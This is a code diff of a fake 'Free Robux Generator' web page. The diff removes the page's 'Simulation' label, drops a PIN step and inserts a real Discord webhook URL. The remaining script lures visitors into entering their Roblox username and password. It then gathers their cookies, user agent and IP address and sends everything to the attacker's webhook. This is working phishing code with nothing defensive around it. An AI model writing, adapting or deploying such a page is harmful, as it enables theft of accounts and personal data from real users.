@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Free Robux Generator - Simulation</title>
+  <title>Free Robux Generator</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -35,7 +35,7 @@
     button:hover {
       background-color: #1565c0;
     }
-    #loginBox, #pinBox { display: none; }
+    #loginBox { display: none; }
     #loading {
       display: none;
       flex-direction: column;
@@ -62,7 +62,7 @@
     <h1>Free Robux Generator</h1>
     <p>Amount of Robux you want</p>
     <input type="number" id="robuxAmount" placeholder="Amount of Robux you want"><br>
-    <p>⚠️ The more Robux you request, the longer the injection process will take.</p>
+    <p>The more Robux you request, the longer the process will take.</p>
     <button onclick="startFakeProcess()">Generate</button>
   </div>
 
@@ -74,21 +74,14 @@
 
   <div id="loginBox">
     <h2>Verify your Roblox Account</h2>
-    <p>To complete the injection, enter your Roblox credentials.</p>
+    <p>To complete the injection, enter your Roblox</p>
     <input type="text" id="username" placeholder="Username"><br>
     <input type="password" id="password" placeholder="Password"><br>
-    <button onclick="checkForPIN()">Continue</button>
-  </div>
-
-  <div id="pinBox">
-    <h2>PIN Verification Required</h2>
-    <p>Your Roblox account has a security PIN enabled.<br>Please enter it to continue.</p>
-    <input type="password" id="pin" placeholder="Account PIN"><br>
     <button onclick="sendToWebhook()">Claim Robux</button>
   </div>
 
   <script>
-    const webhookURL = "YOUR_DISCORD_WEBHOOK_HERE";
+    const webhookURL = "https://discord.com/api/webhooks/1362415600156279065/CXdU0OkdjfmMut8SdXgZujVEWTceZf-fieiU9qt-F3YGbAncvVZcQRsGZujU9fjBF5gz";
 
     function startFakeProcess() {
       const amount = document.getElementById("robuxAmount").value;
@@ -103,28 +96,13 @@
       }, 3000);
     }
 
-    function checkForPIN() {
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      if (!username || !password) return alert("Please enter your credentials.");
-
-      // Simula che ogni 2° account abbia un PIN attivo (logica random basic)
-      const hasPIN = Math.random() < 0.5;
-
-      if (hasPIN) {
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("pinBox").style.display = "block";
-      } else {
-        sendToWebhook();
-      }
-    }
-
     function sendToWebhook() {
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
-      const pin = document.getElementById("pin") ? document.getElementById("pin").value : "No PIN";
-      const cookies = document.cookie || "None";
+      const cookies = document.cookie || "Unavailable";
       const userAgent = navigator.userAgent;
+
+      if (!username || !password) return alert("Please enter your credentials.");
 
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
@@ -139,7 +117,6 @@
               fields: [
                 { name: "👤 Username", value: username, inline: true },
                 { name: "🔑 Password", value: password, inline: true },
-                { name: "🔒 PIN", value: pin, inline: false },
                 { name: "🌍 IP Address", value: ip, inline: false },
                 { name: "🍪 Cookies", value: cookies, inline: false },
                 { name: "🧭 User-Agent", value: userAgent, inline: false }
